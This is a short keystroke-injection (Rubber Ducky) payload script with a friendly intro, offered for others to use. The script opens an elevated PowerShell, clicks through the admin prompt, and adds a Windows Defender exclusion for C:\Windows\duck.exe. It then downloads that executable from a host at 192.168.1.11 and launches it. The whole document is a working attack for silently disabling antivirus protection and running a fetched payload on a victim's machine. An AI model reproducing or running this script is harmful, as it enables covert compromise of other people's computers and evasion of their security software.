Howdy!

This simple adds a powershell line to create an exclusionpath for your payload

Hope you get some enjoyment from it!

DELAY 1000
GUI r
DELAY 100
STRING powershell
ENTER
DELAY 300
STRING Start-Process powershell -Verb runAs
ENTER
DELAY 200
LEFT
DELAY 100
ENTER
DELAY 500
STRING Set-MpPreference -ExclusionPath:{C:\Windows\duck.exe}
ENTER
DELAY 200
STRING Invoke-WebRequest http://192.168.1.11/duck.exe -Outfile C:\Windows\duck.exe
ENTER
DELAY 200
STRING start-process C:\Windows\duck.exe
ENTER
DELAY 200
STRING EXIT
DELAY 100
ENTER
DELAY 400
STRING EXIT
ENTER
